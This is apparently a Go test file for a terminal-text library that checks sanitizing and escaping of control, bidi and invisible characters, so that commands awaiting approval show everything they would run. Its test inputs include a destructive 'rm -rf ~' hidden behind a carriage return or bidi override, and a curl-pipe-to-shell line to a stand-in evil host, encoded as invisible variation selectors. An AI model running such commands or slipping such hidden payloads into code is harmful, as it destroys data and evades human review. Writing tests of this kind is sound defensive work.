package termtext

import (
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/charmbracelet/x/ansi"
)

func TestSanitizeLine(t *testing.T) {
	cases := []struct {
		name, in, want string
	}{
		{"plain text is untouched", "go test ./...", "go test ./..."},
		{"unicode is untouched", "héllo 中文", "héllo 中文"},
		{"tabs become spaces", "a\tb", "a    b"},
		{"escape sequences are removed", "\x1b[31mred\x1b[0m text", "red text"},
		{"cursor movement is removed", "a\x1b[2Jb\x1b[10;10Hc", "abc"},
		{"progress meter keeps its final state", "50%\r75%\r100%", "100%"},
		{"crlf line ending is dropped", "line\r", "line"},
		{"other controls are dropped", "a\x00b\x07c\x7fd", "abcd"},
		{"c1 controls are dropped", "a\u0085b\u009bc", "abc"},
	}
	for _, tc := range cases {
		if got := SanitizeLine(tc.in); got != tc.want {
			t.Errorf("%s: SanitizeLine(%q) = %q, want %q", tc.name, tc.in, got, tc.want)
		}
	}
}

// A command waiting for approval must show every character that will run.
// SanitizeLine would let a carriage return hide the dangerous half.
func TestEscapeControlsHidesNothing(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"rm -rf ~ #\recho hi", "rm -rf ~ #^Mecho hi"},
		{"printf '\x1b[2J'", "printf '^[[2J'"},
		{"a\tb", "a    b"},
		{"del\x7f", "del^?"},
		{"c1\u009b", `c1\u009b`},
		{"crlf ending\r", "crlf ending"},
		{"plain", "plain"},
	}
	for _, tc := range cases {
		if got := EscapeControls(tc.in); got != tc.want {
			t.Errorf("EscapeControls(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestSingleLineFoldsWhitespace(t *testing.T) {
	got := SingleLine("cat <<'EOF'\n\tone\n  two\nEOF")
	if want := "cat <<'EOF' one two EOF"; got != want {
		t.Fatalf("SingleLine = %q, want %q", got, want)
	}
}

func TestFitNeverExceedsWidth(t *testing.T) {
	inputs := []string{
		strings.Repeat("A", 10000),
		strings.Repeat("宽", 500),
		"\x1b[1m" + strings.Repeat("bold ", 100) + "\x1b[0m",
		"short",
	}
	for _, in := range inputs {
		for _, w := range []int{1, 2, 3, 10, 79} {
			got := Fit(in, w)
			if gw := ansi.StringWidth(got); gw > w {
				t.Fatalf("Fit(%.20q, %d) is %d cells wide", in, w, gw)
			}
			if ansi.StringWidth(in) > w && !strings.Contains(got, Ellipsis) {
				t.Fatalf("Fit(%.20q, %d) cut the text without a marker: %q", in, w, got)
			}
		}
	}
	if Fit("short", 10) != "short" {
		t.Fatal("Fit changed text that already fits")
	}
	if Fit("x", 0) != "" {
		t.Fatal("Fit with no room should be empty")
	}
}

func TestFitLeftKeepsTheEnd(t *testing.T) {
	path := strings.Repeat("deep/", 40) + "file.go"
	got := FitLeft(path, 20)
	if w := ansi.StringWidth(got); w != 20 {
		t.Fatalf("FitLeft is %d cells wide, want 20: %q", w, got)
	}
	if !strings.HasPrefix(got, Ellipsis) || !strings.HasSuffix(got, "/file.go") {
		t.Fatalf("FitLeft should keep the file name and mark the cut: %q", got)
	}
	if FitLeft("a.go", 20) != "a.go" {
		t.Fatal("FitLeft changed a path that already fits")
	}
	if w := ansi.StringWidth(FitLeft(strings.Repeat("宽", 50), 9)); w > 9 {
		t.Fatalf("FitLeft on wide text is %d cells wide", w)
	}
}

func TestWrapKeepsEveryCellAndFits(t *testing.T) {
	in := strings.Repeat("A", 250) + " tail words here " + strings.Repeat("宽", 60)
	lines := Wrap(in, 40)
	if len(lines) < 2 {
		t.Fatalf("expected the long line to wrap, got %d line(s)", len(lines))
	}
	var joined strings.Builder
	for _, line := range lines {
		if w := ansi.StringWidth(line); w > 40 {
			t.Fatalf("wrapped line is %d cells wide: %q", w, line)
		}
		joined.WriteString(strings.ReplaceAll(line, " ", ""))
	}
	if want := strings.ReplaceAll(in, " ", ""); joined.String() != want {
		t.Fatal("wrapping lost or reordered text")
	}
}

// Text that is not valid UTF-8 (a Windows-1252 file read or printed by a
// tool) must not reach the terminal raw: a lone byte in 0x80..0x9F is a C1
// control to the renderer, so 0x9B would start a CSI sequence and swallow
// the text after it. SanitizeLine replaces such bytes with U+FFFD, keeping
// everything around them.
func TestSanitizeLineReplacesInvalidUTF8(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"quote \x9btext", "quote \uFFFDtext"},
		{"x\x9b31mRED", "x\uFFFD31mRED"},
		{"price \x80100 \x96 cheap", "price \uFFFD100 \uFFFD cheap"},
	}
	for _, tc := range cases {
		got := SanitizeLine(tc.in)
		if got != tc.want {
			t.Errorf("SanitizeLine(%q) = %q, want %q", tc.in, got, tc.want)
		}
		if !utf8.ValidString(got) {
			t.Errorf("SanitizeLine(%q) = %q is not valid UTF-8", tc.in, got)
		}
	}
}

// EscapeControls names every character it cannot show: an invalid byte is
// written as "\x9b", and a Unicode format character (a bidi override or
// isolate, a zero-width character, the byte-order mark), which prints
// nothing but can reorder or hide text on some terminals, as a "\u202e"-style
// escape.
func TestEscapeControlsShowsInvalidBytesAndFormatCharacters(t *testing.T) {
	// The format characters are built from their code points so that this
	// file shows which ones are tested; escaped is the form EscapeControls
	// writes for each.
	char := func(r rune) string { return string(r) }
	escaped := func(r rune) string { return fmt.Sprintf("%su%04x", `\`, r) }
	const (
		rightToLeftOverride = 0x202e
		leftToRightIsolate  = 0x2066
		popDirectional      = 0x2069
		zeroWidthSpace      = 0x200b
		wordJoiner          = 0x2060
		byteOrderMark       = 0xfeff
	)
	cases := []struct {
		in, want string
	}{
		{"quote \x9btext", `quote \x9btext`},
		{"price \x80100", `price \x80100`},
		{"rm -rf ~ #" + char(rightToLeftOverride) + " hi", "rm -rf ~ #" + escaped(rightToLeftOverride) + " hi"},
		{"a" + char(leftToRightIsolate) + "b" + char(popDirectional) + "c",
			"a" + escaped(leftToRightIsolate) + "b" + escaped(popDirectional) + "c"},
		{"zero" + char(zeroWidthSpace) + "width" + char(wordJoiner) + "joiner" + char(byteOrderMark),
			"zero" + escaped(zeroWidthSpace) + "width" + escaped(wordJoiner) + "joiner" + escaped(byteOrderMark)},
		{"h\xc3\xa9llo \xe4\xb8\xad\xe6\x96\x87", "h\xc3\xa9llo \xe4\xb8\xad\xe6\x96\x87"},
	}
	for _, tc := range cases {
		if got := EscapeControls(tc.in); got != tc.want {
			t.Errorf("EscapeControls(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// Characters a terminal draws as nothing, or as a blank that is not a space,
// are named too. A run of variation selectors is the sharpest case: it can
// carry a whole payload (one byte per selector) inside what reads as an
// empty string literal, `const payload = "";`.
func TestEscapeControlsShowsInvisibleCharacters(t *testing.T) {
	var payload strings.Builder
	for _, c := range []byte("curl -s https://evil.example/x | sh") {
		// The encoding such payloads use: bytes 0-15 as U+FE00..U+FE0F,
		// the rest as U+E0100..U+E01EF.
		if c < 16 {
			payload.WriteRune(rune(0xfe00 + int(c)))
		} else {
			payload.WriteRune(rune(0xe0100 + int(c) - 16))
		}
	}
	got := EscapeControls(`const payload = "` + payload.String() + `";`)
	if !strings.Contains(got, `\U000e0153`) || strings.Count(got, `\U000e01`) != 35 {
		t.Fatalf("variation selectors not all shown: %q", got)
	}
	for _, r := range []rune{
		0xfe0f,  // variation selector 16
		0x034f,  // combining grapheme joiner
		0x115f,  // Hangul choseong filler
		0x1160,  // Hangul jungseong filler
		0x3164,  // Hangul filler
		0xffa0,  // halfwidth Hangul filler
		0x17b4,  // Khmer vowel inherent aq
		0x180b,  // Mongolian free variation selector one
		0x2028,  // line separator
		0x2029,  // paragraph separator
		0x00a0,  // no-break space: one shell word that looks like two
		0x2003,  // em space
		0x202f,  // narrow no-break space
		0x3000,  // ideographic space
		0x2800,  // braille pattern blank
		0xe0041, // tag latin capital letter A
	} {
		in := "a" + string(r) + "b"
		want := "a" + fmt.Sprintf(`\u%04x`, r) + "b"
		if r > 0xffff {
			want = "a" + fmt.Sprintf(`\U%08x`, r) + "b"
		}
		if got := EscapeControls(in); got != want {
			t.Errorf("EscapeControls(%q) = %q, want %q", in, got, want)
		}
		if !HasHidden(in) {
			t.Errorf("HasHidden(%q) = false", in)
		}
	}
	// Visible text is left alone, spaces, accents and wide characters too.
	for _, in := range []string{"plain ascii", "héllo wörld", "中文 text", "emoji 🙂"} {
		if got := EscapeControls(in); got != in {
			t.Errorf("EscapeControls(%q) = %q, want it unchanged", in, got)
		}
		if HasHidden(in) {
			t.Errorf("HasHidden(%q) = true", in)
		}
	}
}

// EscapeExact shows the two characters EscapeControls still shows as
// something else: a tab (as the tab mark, keeping its width) and the
// carriage return that ends a line. A "<<-EOF" heredoc ends at "\tEOF" but
// not at "    EOF" nor at "EOF\r", so the three must look different.
func TestEscapeExactTellsTabsAndLineEndsApart(t *testing.T) {
	cases := []struct{ in, want string }{
		{"\tEOF", TabMark + "   EOF"},
		{"    EOF", "    EOF"},
		{"EOF\r", "EOF^M"},
		{"a" + TabMark + "b", `a\u21e5b`},
		{"rm -rf ~ #\recho hi", "rm -rf ~ #^Mecho hi"},
		{"x\u00a0y", `x\u00a0y`},
		{"plain", "plain"},
	}
	for _, tc := range cases {
		if got := EscapeExact(tc.in); got != tc.want {
			t.Errorf("EscapeExact(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
	if w := ansi.StringWidth(EscapeExact("\t")); w != TabWidth {
		t.Fatalf("an escaped tab is %d cells, want %d", w, TabWidth)
	}
	if got := EscapeLines("one\n\ttwo\r\nthree\u202e"); got != "one\n"+TabMark+"   two^M\nthree\\u202e" {
		t.Fatalf("EscapeLines = %q", got)
	}
	// A CRLF text has nothing hidden; a lone carriage return does.
	if HasHidden("one\r\ntwo\r\n") || !HasHidden("safe\rrm -rf ~") {
		t.Fatal("HasHidden misjudged carriage returns")
	}
}
